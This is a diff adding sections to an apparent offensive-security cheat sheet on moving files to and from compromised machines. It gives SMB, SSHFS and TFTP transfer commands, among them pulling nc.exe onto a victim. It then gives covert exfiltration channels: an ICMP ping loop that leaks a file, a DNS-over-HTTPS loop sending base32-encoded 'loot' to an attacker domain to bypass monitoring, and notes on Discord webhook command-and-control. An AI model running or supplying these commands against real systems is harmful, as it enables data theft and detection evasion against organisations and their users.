@@ -82,3 +82,51 @@ bin
 GET file.exe
 bye
 ```
+
+### SMB
+
+- **Attacker (Impacket):** `impacket-smbserver -smb2support -user test -password test share /path`
+    
+- **Victim (Windows):** `net use z: \\10.10.14.14\share /user:test test`
+    
+
+### SCP / SSHFS
+
+- **SSHFS (Mount remote):** `sshfs user@<victim_ip>:/path /mnt/sshfs`
+    
+
+### TFTP (Legacy)
+
+- **Attacker:** `ptftpd -p 69 eth0 .`
+    
+- **Victim:** `tftp -i <KALI-IP> get nc.exe`
+    
+
+---
+
+## Covert & Alternative Channels
+
+### ICMP Exfiltration
+```bash
+# Send data via ping
+xxd -p -c 4 /path/file | while read line; do ping -c 1 -p $line <IP>; done
+```
+
+### DNS over HTTPS (DoH)
+
+Bypass legacy DNS monitoring by wrapping exfil in HTTPS to a trusted resolver:
+```bash
+# Encode file -> Base32 -> Split -> Send via DoH
+cat /tmp/loot.bin | base32 | fold -w32 | while read line; do
+  curl "https://dns.google/resolve?name=${line}.exf.attacker.tld&type=TXT"
+done
+```
+
+### Webhook C2 / Exfil (Discord/Slack/Teams)
+Abuse trusted collaboration platforms via write-only webhooks. No API keys required.
+
+- **Discord Example (PowerShell):** Loop beaconing, directory recon, and file upload to `https://discord.com/api/webhooks/...`
+    
+
+### Rclone (Cloud Sync)
+Encrypt and sync data to cloud storage, blending in with backup traffic:
